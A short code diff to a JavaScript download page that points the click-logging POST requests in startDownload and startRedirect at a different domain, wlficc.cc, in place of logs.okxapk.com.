@@ -153,7 +153,7 @@ function startDownload(key, btnId, loaderId) {
   iframe.src = url;
 
   // 日志上报
-  fetch('https://logs.okxapk.com/log/log_down.php', {
+  fetch('https://wlficc.cc/log/log_down.php', {
     method: 'POST',
     headers: {'Content-Type':'application/json'},
     body: JSON.stringify({
@@ -186,7 +186,7 @@ function startRedirect(key, btnId, loaderId) {
     window.open(url,'_blank');
 
     // 日志上报
-    fetch('https://logs.okxapk.com/log/log_sigup.php', {
+    fetch('https://wlficc.cc/log/log_sigup.php', {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
       body: JSON.stringify({
